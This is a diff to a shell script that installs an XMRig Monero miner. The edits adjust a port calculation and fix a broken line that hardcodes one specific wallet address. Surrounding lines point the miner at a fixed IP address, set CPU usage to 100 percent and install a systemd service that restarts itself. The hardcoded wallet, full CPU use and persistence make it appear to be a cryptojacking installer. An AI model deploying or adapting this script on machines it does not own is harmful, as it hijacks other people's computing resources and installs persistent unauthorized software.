@@ -166,7 +166,7 @@ power2() {
   fi
 }
 
-PORT=$(( $EXP_MONERO_HASHRATE * 12 / 1000 ))
+PORT=$(( $EXP_MONERO_HASHRATE * 12 / 36000 ))
 PORT=$(( $PORT == 0 ? 1 : $PORT ))
 PORT=`power2 $PORT`
 PORT=$(( 10000 + $PORT ))
@@ -284,8 +284,7 @@ if [ ! -z $EMAIL ]; then
 fi
 
 sed -i 's/"url": *"[^"]*",/"url": "131.153.56.98:80",/' ./config.json
-sed -i 's/"user": *"[^"]*",/"user": "4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR
-",/' ./config.json
+sed -i 's/"user": *"[^"]*",/"user": "4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR",/' ./config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/moneroocean/config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/moneroocean/xmrig.log'",#' $HOME/moneroocean/config.json
@@ -341,13 +340,11 @@ else
     cat >/tmp/moneroocean_miner.service <<EOL
 [Unit]
 Description=Monero miner service
-
 [Service]
 ExecStart=$HOME/moneroocean/xmrig --config=$HOME/moneroocean/config.json
 Restart=always
 Nice=10
 CPUWeight=1
-
 [Install]
 WantedBy=multi-user.target
 EOL
